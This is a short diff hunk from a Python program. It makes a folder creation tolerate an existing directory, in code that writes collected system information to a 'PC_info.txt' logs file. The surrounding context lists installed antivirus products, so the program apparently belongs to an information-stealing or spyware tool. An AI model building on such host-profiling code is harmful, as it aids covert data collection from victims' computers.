@@ -255,7 +255,7 @@ Antiviruses: {', '.join(Antiviruses)}
     try:
         user = environ['USERPROFILE']
         pathToLogs = f'{user}\\{config.pathToLogs}\\System'
-        makedirs(pathToLogs)
+        makedirs(pathToLogs, exist_ok=True)
         file = open(f'{pathToLogs}\\PC_info.txt', "w+", encoding='utf-8')
         file.write(systeminfo)
         file.close()
